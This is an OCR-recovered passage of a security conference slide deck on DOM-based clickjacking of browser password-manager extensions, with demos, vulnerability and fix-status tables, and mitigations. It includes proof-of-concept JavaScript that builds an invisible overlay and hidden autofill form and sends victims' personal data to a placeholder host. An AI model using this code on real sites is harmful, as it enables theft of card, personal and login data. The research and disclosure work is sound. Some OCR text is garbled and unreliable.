document.documentElement.style. **backgroundImage** = url(“ **website.png** ”);


> Recovered by OCR — confidence 75/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
im CO Elements Console Sources Network — Performar
***<!IDOCTYPE html> == $0
document.documentElement.style.backgroundImage = url(“website.png’);
```

## Slide 90


> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
We use cookie to improve your experience
on our site. By using our site you consent
cookies.
Allow Cookies
Decline
ik LO Elements Console Sources Network Pe :K LO Elements Console Sources Network = Performar
<html> <html style="background-image: url("website.png");">
> <com-1password-menu> ©) </com-1password-menu>
> <com-1password-button> ©.) </com-1password-button>
> <com-1password-menu> ©) </com-1password-menu>
```

## Slide 91


> Recovered by OCR — confidence 81/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
We use cookie to improve your experience
on our site. By using our site you consent
cookies.
Allow Cookies
Decline
im LO Elements Console Sources Network Pe ik LO Elements Console Sources Network Performar
***<IDOCTYPE html> == $0 se<!IDOCTYPE html> == $0
<html> <html style="background-image: url("website.png");">
> <com-1password-button> -) </com-1password-button > <com-1password-button> ©.) </com-1password-button>
> <com-1password-menu> «--) </com-1password-menu> > <com-1password-menu> ©) </com-1password-menu>
</body> </body>
</html> </html>
```

## Slide 92

**DEMO** 3

## Slide 93

**DOM-based Extension Clickjacking** └── **Extension Element** ├── Root Element └── Child Element └── **Parent Element** ├── BODY └── HTML

## Slide 94

## **Parent Element:** HTML

● User sets **opacity:0** for **<html>** - everything is transparent

- Victim must **click on blank page** - less practical

● “Clicking” game - Reaction Time, Visual Memory Test

## Slide 95

**DOM-based Extension Clickjacking** └── **Extension Element** ├── Root Element └── Child Element └── **Parent Element** ├── BODY └── HTML └── **Overlay** └── Partial Overlay

## Slide 96


> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
i® [0 Elements Console Sources Network Performance Memory Application Privacy and security
<!DOCTYPE htm1> Styles Computed Layout Event Listeners
<html> _———
<head></head> Y Filter
v <body> com-1password-menu {
all: » initial !important;
position: fixed !important;
z-index: 2147483647 !important;
> <loginform> «> </loginform>
ss» <com-1password-menu>«--)</com-1password-menu> == $0 right: @px !important;
</body> top: @px !important;
</html> bottom: @px !important;
Left: @px !important;
pointer-events: none !important;
```

## Slide 97


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ik fo Elements Console Sources Network Performance
<!DOCTYPE html>
<head></head>
v <body>
> <loginform> «> </loginform>
> <com-1password-menu> «--)</com-1password-menu> ==
$0
Memory Application Privacy and security
Styles Computed Layout Event Listeners
Y Filter
com-1password-menu {
all: » initial !important;
z-index: 2147483647 !important;
top: @px !important;
bottom: @px !important;
left: @px !important;
pointer-events: none !important;
```

## Slide 98


> Recovered by OCR — confidence 73/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Marektoth
username =
=x CO Elements Console Sources Network Performance
<head></head>
v <body>
> <loginform> @-) </loginform>
> <com-1password-button> «--) </com-1password-button>
> <com-1password-menu> (-) </com-1password-menu>
```

## Slide 99


> Recovered by OCR — confidence 75/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Marektoth
username =
Ma
ix Co Elements Console Sources Network Performance
se<!IDOCTYPE html> == $0
<head></head>
v <body>
> <loginform> ©) </loginform>
> <com-1password-button> «--) </com-1password-button>
>» <com-1p ord-menu> +) </com-1password-menu>
```

## Slide 100

**div1**


> Recovered by OCR — confidence 71/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
7k Lo Elements Console Sources Network Performance
**<!IDOCTYPE html> == $0
<head></head>
vy <body>
> <com-1password-menu> «.) </com-1password-menu>
```

## Slide 101

div1

div2


> Recovered by OCR — confidence 71/100 on the text kept, 54/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
7k Lo Elements Console Sources Network Performance
**<!IDOCTYPE html> == $0
<head></head>
vy <body>
> <com-1password-menu> «.) </com-1password-menu>
```

## Slide 102

div3
div1
div2


> Recovered by OCR — confidence 75/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
div2
7k Lo Elements Console Sources Network Performance
*<IDOCTYPE html> == $0
<head></head>
vy <body>
> <com-1password-menu> «) </com-1password-menu>
```

## Slide 103

div4
div3
div1
div2


> Recovered by OCR — confidence 75/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
div2
7k Lo Elements Console Sources Network Performance
*<IDOCTYPE html> == $0
<head></head>
vy <body>
> <com-1password-menu> ©) </com-1password-menu>
```

## Slide 104

**div4 div3 div1** × **div2**


> Recovered by OCR — confidence 75/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
hy e
div2
Network
cx Lo Elements Console Performance
**<!IDOCTYPE html> == $0
<head></head>
vy <body>
> <com-1password-menu> “--) </com-1password-menu>
```

## Slide 105

×


> Recovered by OCR — confidence 72/100 on the text kept, 55/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
x
7k Lo Elements Console Sources Network Performance
**<!IDOCTYPE html> == $0
<head></head>
vy <body>
> <com-1password-menu> «.) </com-1password-menu>
```

## Slide 106

**DOM-based Extension Clickjacking** └── **Extension Element** ├── Root Element └── Child Element └── **Parent Element** ├── BODY └── HTML └── **Overlay** ├── Partial Overlay └── Full Overlay

## Slide 107


> Recovered by OCR — confidence 78/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Marektoth
ik [0 Elements Console Sources Network Performance
***<!DOCTYPE html> == $0
<head></head>
> <loginform> @-) </loginform>
> <com-1password-menu> ©.) </com-1password-menu>
```

## Slide 108


> Recovered by OCR — confidence 80/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Marektoth
username =
ik Lo Elements Console Sources Network Performance
***<!DOCTYPE html> == $0
<head></head>
vy <body>
```

## Slide 109

**div1**


> Recovered by OCR — confidence 74/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Rn fo Elements Console Sources Network Performance
s*e<!DOCTYPE html> == $0
<head> </head>
Y <body>
> <loginform> @) </loginform>
> <com-1password-menu> “-) </com-1password-menu>
```

## Slide 110

div1

**pointer-events: none;**


> Recovered by OCR — confidence 83/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ik Lo Elements Console Sources Network Performance
**<IDOCTYPE html> == $0
<head> </head>
pointer-events: none,
> <com-1password-menu> ©.) </com-1password-menu>
```

## Slide 111


> Recovered by OCR — confidence 78/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Marektoth
ik [0 Elements Console Sources Network Performance
***<!DOCTYPE html> == $0
<head></head>
> <loginform> @-) </loginform>
> <com-1password-menu> ©.) </com-1password-menu>
```

## Slide 112

<div id=" **popover** " popover=" **manual** " style="pointer-events: none;…”></div>

document.getElementById( **'popover'** ) **.showPopover()** ;

## Slide 113


> Recovered by OCR — confidence 79/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Marektoth
username =
ik Lo Elements Console Sources Network Performance
s<!DOCTYPE html> == $0
<head></head>
vy <body>
> <com-1password-menu> ©.) </com-1password-menu>
```

## Slide 114


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Privacy & Transparency
We and our partners use cookies to Store and/or access information on a device. We and our partners use
data for Personalised ads and content, ad and content measurement, audience insights and product
development. An example of data being processed may be a unique identifier stored in a cookie. Some of our
partners may process your data as a part of their legitimate business interest without asking for consent. To
view the purposes they believe they have legitimate interest for, or to object to this data processing use the
vendor list link below. The consent submitted will only be used for data processing originating from this
website. If you would like to change your settings or withdraw consent at any time, the link to do so is in our
privacy policy accessible from our home page.
XK £0 Elements Console Sources Network Performance Memory Application
s<IDOCTYPE html> == $0
<head></head>
<body>
><div id="popover" popover="manual" style="pointer-events: none;position: fixed;
> <com-1password-button> «-.) </com-1password-button>
> <com-1password-menu> «-) </com-1password-menu>
vS div
G ::backdrop
reveal
reveal
```

## Slide 115


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Privacy & Transparency
We and our partners use cookies to Store and/or access information on a device. We and our partners use
data for Personalised ads and content, ad and content measurement, audience insights and product
development. An example of data being processed may be a unique identifier stored in a cookie. Some of our
partners may process your data as a part of their legitimate business interest without asking for consent. To
view the purposes they believe they have legitimate interest for, or to object to this data processing use the
vendor list link below. The consent submitted will only be used for data processing originating from this
website. If you would like to change your settings or withdraw consent at any time, the link to do so is in our
privacy policy accessible from our home page.
XK £0 Elements Console Sources Network Performance Memory Application
s<IDOCTYPE html> == $0
<head></head>
<body>
<script src="https://websecurity.dev/overlay/script.js"></script>
><div id="popover" popover="manual" style="pointer-events: none;position: fixed;
> <loginform> ©) </loginform>
> <com-1password-button> «-.) </com-1password-button>
> <com-1password-menu> «-) </com-1password-menu>
v #top-layer
vS div
G ::backdrop
reveal
reveal
```

## Slide 116


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Privacy & Transparency
We and our partners use cookies to Store and/or access information on a device. We and our partners use
data for Personalised ads and content, ad and content measurement, audience insights and product
development. An example of data being processed may be a unique identifier stored in a cookie. Some of our
partners may process your data as a part of their legitimate business interest without asking for consent. To
view the purposes they believe they have legitimate interest for, or to object to this data processing use the
vendor list link below. The consent submitted will only be used for data processing originating from this
website. If you would like to change your settings or withdraw consent at any time, the link to do so is in our
privacy policy accessible from our home page.
XK £0 Elements Console Sources Network Performance Memory Application
s<IDOCTYPE html> == $0
<head></head>
<body>
<script src="https://websecurity.dev/overlay/script.js"></script>
><div id="popover" popover="manual" style="pointer-events: none;position: fixed;
> <loginform> ©) </loginform>
> <com-1password-button> «-.) </com-1password-button>
> <com-1password-menu> «-) </com-1password-menu>
v #top-layer
vS div
G ::backdrop
reveal
reveal
```

## Slide 117


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Privacy & Transparency
We and our partners use cookies to Store and/or access information on a device. We and our partners use
data for Personalised ads and content, ad and content measurement, audience insights and product
development. An example of data being processed may be a unique identifier stored in a cookie. Some of our
partners may process your data as a part of their legitimate business interest without asking for consent. To
view the purposes they believe they have legitimate interest for, or to object to this data processing use the
vendor list link below. The consent submitted will only be used for data processing originating from this
website. If you would like to change your settings or withdraw consent at any time, the link to do so is in our
privacy policy accessible from our home page.
XK £0 Elements Conole ources Network Performance Memory Application
s<IDOCTYPE html> == $0
<head></head>
<body>
<script src="https://websecurity Wev/overlay/script.js"></script>
><div id="popover" popover="manua’ style="pointer-events: none;position: fixed;
> <loginform> ©) </loginform>
> <com-1password-menu> «-) </com-1password-menu>
v #top-layer
vS div
G ::backdrop
reveal
reveal
```

## Slide 118


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Privacy & Transparency
We and our partners use cookies to Store and/or access information on a device. We and our partners use
data for Personalised ads and content, ad and content measurement, audience insights and product
development. An example of data being processed may be a unique identifier stored in a cookie. Some of our
partners may process your data as a part of their legitimate business interest without asking for consent. To
view the purposes they believe they have legitimate interest for, or to object to this data processing use the
vendor list link below. The consent submitted will only be used for data processing originating from this
ebsite. ou would Ji Ce consent at any time, the link to do so is in our
privacy policy accessibl from our home page.
XK £0 Elements Console Sources Network Performance Memory Application
s<IDOCTYPE html> == $0
<head></head>
<body>
<script src="https://websecurity.dev/overlay/script.js"></script>
><div id="popover" popover="manual" style="pointer-events: none;position: fixed;
left: -1@px;width: 100%;height: 100%;opacity: 0.5;">()</div>
> <loginform> @) </loginform>
> <com-1password-button> «.) </com-1password-button>
> <com-1password-menu> ¢--) </com-1password-menu>
YS div CR reveal)
GS ::backdrop CE reveal )
```

## Slide 119

**DEMO** 4

## Slide 120

**DOM-based Extension Clickjacking** └── **Extension Element** ├── Root Element └── Child Element └── **Parent Element** ├── BODY └── HTML └── **Overlay** ├── Partial Overlay └── Full Overlay

## Slide 121

**PoC Exploit Code:** Full Overlay


> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PoC Exploit Code: Full Overlay
const dialog = document.createElement("cookie") ;
dialog. innerHTML ~<div id="popover" popover="manual" style="pointer-events: none; display: none; pos
setTimeout(() => {
document.getElementById('popover' ).showPopover();
}, 1000);
setTimeout(() => {
const personalform = document.createElement('div');
personalform.id ‘personalform' ;
personalform. style “position: fixed; top: 179px; left: 43@px; z-index: 2147483647;";
personalform. innerHTML ~<form method="post" onchange="getData()" action="/">
<input id="name" name="name" type="text" autocomplete="name">
<input id="email" nam email" type="email" autocomplete="email" autofocus>
<input id="phone" name="phone" type="tel" autocomplete="tel">
<input id="street" name="street" type="text" autocomplete="street-address">
<input id="zipcode" name="zipcode" type="text" autocomplete="postal-code">
<input id="city" name="city" type="text" autocomplete="address-level2">
<input id="country" name="country" type="text" autocomplete="country">
</form> ;
document .body .appendChild(personalform) ;
setTimeout(() => {
}, 508);
```

## Slide 122

**PoC Exploit Code:** Full Overlay


> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PoC Exploit Code: Full Overlay
const dialog = document.createElement("cookie") ;
dialog. innerHTML ~<div id="popover" popover="manual" style="pointer-events: none; display: none; pos
setTimeout(() => {
document.getElementById('popover' ).showPopover();
}, 1000);
setTimeout(() => {
const personalform = document.createElement('div');
personalform.id ‘personalform' ;
personalform.style = "position: fixed; top: 1Spe™=fetc=stpe 2 simdex: 2147483647;";
personalform. innerHTML ~<form method="post) onchange="getData()" Jaction="/">
<input id="name" name="name" type="text" autolomoletes"name” >
<input id="email" nam email" type="email" autocomplete="email" autofocus>
<input id="phone" name="phone" type="tel" autocomplete="tel">
<input id="street" name="street" type="text" autocomplete="street-address">
<input id="zipcode" name="zipcode" type="text" autocomplete="postal-code">
<input id="city" name="city" type="text" autocomplete="address-level2">
<input id="country" name="country" type="text" autocomplete="country">
</form> ;
document .body .appendChild(personalform) ;
setTimeout(() => {
}, 508);
```

## Slide 123

**PoC Exploit Code:** Full Overlay


> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PoC Exploit Code: Full Overlay
const dialog = document.createElement("cookie") ;
setTimeout(() => {
}, 1000);
setTimeout(() => {
const personalform
personalform.id ‘personalform' ; Az
personalform. innerHTML ~<form method="'
<input id="name" name="name" type="text"
<input id="email" name="email" type="ema: *
<input id="phone" name="phone" type="tel' 4
<input i street" name="street" type="te 47
<input id="zipcode" name="zipcode" type=' j49
<input id="city" name="city" type="text"
<input id="country" name="country" type="'
</form> ;
document.body.appendChild(personalform); 51
setTimeout(() => {
}, 500);
» 2000);
~<div id="popover" popover="manual" style="pointer-events: none; display: none; pos
function getData() {
const
const
const
const
const
const
const
(city
name
email
phone
street
zipcode
city
country
country) {
var personalData [name, email, phone, street,
zipcode, city, country].join('-');
var xhttp XMLHttpRequest();
xhttp.open("GET", "“https://example.com/?data="+personalData, true);
xhttp.send();
```

## Slide 124

## DOM-based Extension Clickjacking **Position**

Fixed “click” position: ● **accept / decline** cookies ● **checkbox** - “Verify you are human” ● **x** - closing newsletter / login dialog

## Slide 125

## DOM-based Extension Clickjacking **Position**

Under mouse cursor (following cursor): ● **extension element** position override ● **new form** position

- every 100ms focus() on input = UI follows the form

## Slide 126

**DEMO** 5

## Slide 127

## DOM-based Extension Clickjacking **Position**

Under mouse cursor (following cursor): ● **extension element** position override ● **new form** position

- every 100ms focus() on input = UI follows the form

**1 click** anywhere on the website = **data leaked**

## Slide 128

### **DOM-based Extension Clickjacking**

|Password Manager|Vulnerable?|
|---|---|
|1Password||
|Bitwarden||
|Dashlane||
|Enpass||
|iCloud Passwords||
|Keeper||
|LastPass||
|LogMeOnce||
|NordPass||
|ProtonPass||
|RoboForm||

## Slide 129

### **DOM-based Extension Clickjacking**

|Password Manager|Vulnerable?|Extension Element|Parent Element|Overlay|
|---|---|---|---|---|
|1Password|||||
|Bitwarden|||||
|Dashlane|||||
|Enpass|||||
|iCloud Passwords|||||
|Keeper|||||
|LastPass|||||
|LogMeOnce|||||
|NordPass|||||
|ProtonPass|||||
|RoboForm|||||

## Slide 130

## DOM-based Extension Clickjacking **Impact**

#### Attacker’s website:

**Credit Card** - credit card number, expiration date, CVC **Personal Data** - name, email, phone, address

**Not domain-specific = can be autofilled anywhere**

## Slide 131

#### **DOM-based Extension Clickjacking** manual autofill

Password Manager Credit Card
1Password
Bitwarden 1 click
Dashlane
Enpass 1 click
iCloud Passwords Not supported
Keeper  5 clicks
LastPass  2 clicks
LogMeOnce 1 click
NordPass 1 click
ProtonPass Not supported
RoboForm 1 click

not exploitable on attacker’s website

## Slide 132

#### **DOM-based Extension Clickjacking** manual autofill

Password Manager Credit Card Personal Data
1Password 1 click
Bitwarden 1 click 1 click
Dashlane
Enpass 1 click 1 click
iCloud Passwords Not supported Not supported
Keeper  5 clicks    5 clicks
LastPass  2 clicks   2 clicks
LogMeOnce 1 click 1 click
NordPass 1 click 1 click
ProtonPass Not supported 1 click
RoboForm 1 click 1 click

not exploitable on attacker’s website

## Slide 133

**DEMO** 6

## Slide 134

DOM-based Extension Clickjacking **Impact**

Website with vulnerability (e.g. XSS): **Login credentials** - username, password, 2FA (TOTP)

## Slide 135


> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Login
Login Form
| teste@test.com
Username
Password
| Coccccccccccceccccce oO | GA test@test.com
Strong Password
Website Address seecccccccccccccscce
| https://example.com ) TOTP
Attach Files, Photos & Videos 811752
Add Two-Factor Code (O)
Add Custom Field
Login
```

## Slide 136

###### DOM-based Extension Clickjacking

## **Impact**

- Website with vulnerability (e.g. XSS): **Login credentials** - username, password, 2FA (TOTP) - only credentials for vulnerable domain

   - allowed autofill on (different) subdomain **by default**

## Slide 137


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
AUTOFILL BEHAVIOR AUTOFILL BEHAVIOR
O Fill anywhere on this website Default) Fill anywhere on this website Default)
Only fill on this exact host O Only fill on this exact host
Never fill on this website Never fill on this website
This item will fill on example.com and This item will fill only on example.com,
some related websites. never on subdomains or parent domains.
```

## Slide 138

###### **credentials saved**

**autofilled (manual autofill)**

→ **example.com** subdomain. **example.com example.com** →    test.subdomain. **example.com** subdomain. **example.com** →          subdomain2. **example.com** subdomain. **example.com** → **example.com**

**accounts** . **google.com** → **test.dev.sandbox.cloud.google.com**

## Slide 139

## DOM-based Extension Clickjacking **Impact**

Website with vulnerability (e.g. XSS): **Login credentials** - username, password, 2FA (TOTP)

- only credentials for vulnerable domain

- allowed autofill on (different) subdomain **by default**

   - .example.com/ *** → wildcard for subdomain**

## Slide 140

#### **DOM-based Extension Clickjacking** manual autofill

|Password Manager|Credit Card|Pers|onal Data
|Login|TOTP|
|---|---|---|---|---|---|
|1Password|||1 click
|1 click||
|Bitwarden|1 click||1 click
|1 click||
|Dashlane||||
 *****||
|Enpass|1 click||1 click
|1 click||
|iCloud Passwords|Not supported|Not|supported
|1 click||
|Keeper|5 clicks||5 clicks
|1 click||
|LastPass|2 clicks||2 clicks
|2 clicks*****||
|LogMeOnce|1 click||1 click
|1 click*****||
|NordPass|1 click||1 click
|1 click||
|ProtonPass|Not supported||1 click
|1 click||
|RoboForm|1 click||1 click
|1 click||

* automatic autofill by default (0-click autofill)

not exploitable on attacker’s website

## Slide 141

#### **DOM-based Extension Clickjacking** manual autofill

|Password Manager|Credit Card|Pers|onal Data
|Login|TOTP|
|---|---|---|---|---|---|
|1Password|||1 click
|1 click
|0 click|
|Bitwarden|1 click||1 click
|1 click
|0 click|
|Dashlane||||
 *****
|
 *****|
|Enpass|1 click||1 click
|1 click
|0 click|
|iCloud Passwords|Not supported|Not|supported
|1 click
|1 click|
|Keeper|5 clicks||5 clicks
|1 click
|0 click|
|LastPass|2 clicks||2 clicks
|2 clicks*****
|0 click*****|
|LogMeOnce|1 click||1 click
|1 click*****
|0 click*****|
|NordPass|1 click||1 click
|1 click||
|ProtonPass|Not supported||1 click
|1 click
|1 click|
|RoboForm|1 click||1 click
|1 click
|1 click|

* automatic autofill by default (0-click autofill)

not exploitable on attacker’s website

## Slide 142

#### **DOM-based Extension Clickjacking** manual autofill

|Password Manager|Credit Card|Pers|onal Data
|Login|TOTP|
|---|---|---|---|---|---|
|1Password|||1 click
|1 click
|0 click|
|Bitwarden|1 click||1 click
|1 click
|0 click|
|Dashlane||||
 *****
|
 *****|
|Enpass|1 click||1 click
|1 click
|0 click|
|iCloud Passwords|Not supported|Not|supported
|1 click
|1 click|
|Keeper|5 clicks||5 clicks
|1 click
|0 click|
|LastPass|2 clicks||2 clicks
|2 clicks*****
|0 click*****|
|LogMeOnce|1 click||1 click
|1 click*****
|0 click*****|
|NordPass|1 click||1 click
|1 click||
|ProtonPass|Not supported||1 click
|1 click
|1 click|
|RoboForm|1 click||1 click
|1 click
|1 click|

* automatic autofill by default (0-click autofill)

not exploitable on attacker’s website

## Slide 143

**DEMO** 7

## Slide 144

DOM-based Extension Clickjacking **Impact**

Website with vulnerability (e.g. XSS): **Passkeys** - authentication flow hijacking

## Slide 145


> Recovered by OCR — confidence 85/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
|i. Log in with Dashlane x
©) Sign in with a passkey @ x
a test@test.com
TestPasskeys.com ze Testpasskeys
example@test.com
Use a different passkey
@® Passkey sign-in
Log in with passkey?
Choose a saved passkey to sign-in to
testpasskeys.com
2 TestPasskeys.com
° testpasskeys.com
example@test.com
Use Non-NordPass Key
order to use a
```

## Slide 146


> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
|i Log in with Dashlane x
©) Sign in with a passkey Qe
example@test.com
a test@test.com
TestPasskeys.com
Use a different passkey
© Passkey sign-in
a Log in with passkey?
Choose a saved passkey to sign-in to
testpasskeys.com
a TestPasskeys.com
Use Non-NordPass Key
testpasskeys.com
example@test.com
order to use a
```

## Slide 147

###### DOM-based Extension Clickjacking

## **Impact**

Website with vulnerability (e.g. XSS):

**Passkeys** - authentication flow hijacking

- strict domain limitation

- session **is not** bound to a challenge

   - = signed assertion (challenge) request can be used without cookie

   - **4/7** tested FIDO Certified solutions were vulnerable

   - **→** 1 user click = attacker logged as victim **with a new session**

**→ add new passkey device = Persistent access**

## Slide 148

#### **DOM-based Extension Clickjacking** manual autofill

|Password Manager|Cre|dit Card|Pers|onal Data|Login|TOTP|Passkeys|
|---|---|---|---|---|---|---|---|
|1Password||||1 click|1 click|0 click|1 click|
|Bitwarden||1 click||1 click|1 click|0 click||
|Dashlane|||||
 *****|
 *****|1 click|
|Enpass||1 click||1 click|1 click|0 click||
|iCloud Passwords|Not|supported|Not s|upported|1 click|1 click||
|Keeper||5 clicks||5 clicks|1 click|0 click|1 click|
|LastPass||2 clicks||2 clicks|2 clicks*****|0 click*****|1 click|
|LogMeOnce||1 click||1 click|1 click*****|0 click*****|1 click|
|NordPass||1 click||1 click|1 click||1 click|
|ProtonPass|Not|supported||1 click|1 click|1 click|1 click|
|RoboForm||1 click||1 click|1 click|1 click|1 click|

* automatic autofill by default (0-click autofill)

not exploitable on attacker’s website

## Slide 149

#### **Fix status (updated 30 July 2025)** reported in April 2025

Password Manager Credit Card Personal Data Login TOTP Passkeys
1Password 1 click INFORMATIVE 1 click 0 click 1 click
Bitwarden 1 click 1 click IN PROGRESS 1 click 0 click
Dashlane* FIXED* * 1 click
Enpass 1 click 1 click IN PROGRESS 1 click 0 click
iCloud Passwords Not supported Not supported IN PROGRESS 1 click 1 click
Keeper  5 clicks    5 clicks  F IXED 1 click 0 click 1 click
LastPass  2 clicks FIX ED   2 clicks  2 clicks  * INFORMATIVE 0 click  * 1 click
LogMeOnce 1 click 1 c lick NOT FIXED - NO EMAIL REPLY 1 click  * 0 click  * 1 click
NordPass 1 click 1 click F IXED 1 click 1 click
ProtonPass Not supported 1 click F IXED 1 click 1 click 1 click
RoboForm 1 click 1 click F IXED 1 click 0 click 1 click

## Slide 150

#### Users at risk **DOM-based Extension Clickjacking**

|Password Manager|Reports / Press|Chrome Web Store / Edge Add-ons  / Firefox Add-ons|
|---|---|---|
|1Password|15 million|5 000 000 / 1 600 000+ / 350 000+|
|Bitwarden|10 million|4 000 000 / 2 100 000+ / 850 000+|
|Dashlane|19 million|1 000 000 / 900 000+ / 117 000+|
|Enpass|2 million|100 000 / 60 000+ / 12 000+|
|iCloud Passwords|---|4 000 000 / 1 400 000+ / 80 000+|
|Keeper|4 million|1 000 000 / 1 300 000+ / 60 000+|
|LastPass|30 million (2022)|9 000 000 / 3 700 000+ / 470 000+|
|LogMeOnce|---|10 000 / 7 000+ / ---|
|NordPass|4,2 million (2024)|700 000 / --- / 44 000+ (2024)|
|ProtonPass|---|600 000 / 42 000+ / 92 000+|
|RoboForm|6 million|600 000 / 500 000+ / 58 000+|

60,2 million users

**39 752 000+** active installations

(30 million LastPass users aren't counted)

## Slide 151

## DOM-based Extension Clickjacking **Detection**

● **detecting all password managers in one script** → e.g. password input - focus()

→ extension element in DOM

## Slide 152

DOM-based Extension Clickjacking **Limitation**

● **auto-lock** / **auto-logout** (inactivity time) by default enabled for: 1Password (10 min) Enpass (1 min)

iCloud Passwords has auto-lock but… **…autofill can be used even app is locked**

## Slide 153


> Recovered by OCR — confidence 94/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Enter the password for the user “apple” to
unlock.
Passwords Is Locked
Enter the password for the user “apple” to
unlock.
Enter password
icloud Passwords
username
marektoth.com
Open Passwords App...
```

## Slide 154


> Recovered by OCR — confidence 94/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passwords Is Locked
Enter the password for the user “apple” to
unlock.
Enter password
=
```

## Slide 155

## DOM-based Extension Clickjacking **Limitation**

● **auto-lock** : closing the browser

● user has to have stored credentials for a domain → vulnerability (XSS, subdomain takeover…)

● **click is needed** from the user

## Slide 156

## DOM-based Extension Clickjacking **Mitigation**

##### **Extension Element**

- styles cannot be changed (MutationObserver)

- - Closed Shadow-Root

##### **Parent Element**

- BODY/HTML opacity detection

- - Popover API

##### **Extension Overlay**

- last DOM element detection (z-index conflict)

- - popover elements list

## Slide 157

## DOM-based Extension Clickjacking **Mitigation**

- elementsFromPoint() can be used for partial overlay

- **Doesn’t exist** simple protection

**new Browser API** should be created

## Slide 158

## DOM-based Extension Clickjacking **Recommendation for users**

- Disable manual autofill = copy/paste only - inconvenient for someone

● Set only exact URL match for autofill credentials

- still can be exploitable credit card/personal data

## Slide 159

DOM-based Extension Clickjacking **Recommendation for users**

Chromium-based browsers:

● Extension settings → site access → “on click”


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DOM-based Extension Clickjacking
Recommendation for users
Chromium-based browsers:
e Extension settings > site access > “on click”
Site access
Allow this extension to read and change all your data on websites you visit: ® On click ¥
Site settings On specific sites
On all sites
```

## Slide 160


> Recovered by OCR — confidence 88/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
v — ® Login Page x +
Reload this page to apply your x
updated settings on this site
Cancel
Login Form Login Form
Username Username
Password Password
```

## Slide 161


> Recovered by OCR — confidence 87/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Login Form
Username
websecurity.dev al
username
```

## Slide 162

## DOM-based Extension Clickjacking **Summary**

● All browser password managers in the research were vulnerable attacker’s website: 6/9 credit card data 8/10 personal data vulnerable domain: 10/11 login credentials 9/11 TOTP 8/11 passkeys

- **Fixed** : **NordPass, ProtonPass, RoboForm, Dashlane, Keeper**

- **Still vulnerable** :

**Bitwarden** ( **Credit Card** , **Personal Data** , Login/TOTP/Passkeys) **1Password** ( **Personal Data** , Login/TOTP/Passkeys) LastPass, iCloud Passwords (Login/TOTP) Enpass (Credit Card, Personal Data, Login/TOTP) LogMeOnce (Credit Card, Personal Data, Login/TOTP, Passkeys)

## Slide 163

## DOM-based Extension Clickjacking **Takeaway**

- Clickjacking is not dead - browser extensions are vulnerable **iframe-based** , **especially to the DOM-based**

- Malicious script can be anywhere (subdomain takeover, XSS… ) **1 click = attacker gets your credentials incl. TOTP** (only for vulnerable domain)

- No vulnerability is needed to leak your credit card, personal data **1 click = credit cards details** or **personal data** (attacker’s website) **2 clicks = credit cards details + personal data** (attacker’s website)

- Research on only 11 password managers others DOM-manipulating extensions will be vulnerable (password managers, crypto wallets, notes etc. )

## Slide 164

## **Links**

The research and presentation is available at:

● **marektoth.com/blog/dom-based-extension-clickjacking** (short url: **mth.dev** )

## Slide 165

## **References**

- https://developer.chrome.com/docs/extensions/reference/manifest/ web-accessible-resources

- https://extensions.neplox.security/Attacks/Clickjacking/

- https://marektoth.com/blog/password-managers-autofill/

- https://www.ackee.agency/blog/welcome-to-the-world-of-passkey

- ● https://developers.google.com/identity/passkeys/developer-guides/ server-authentication

- https://developer.chrome.com/blog/introducing-popover-api

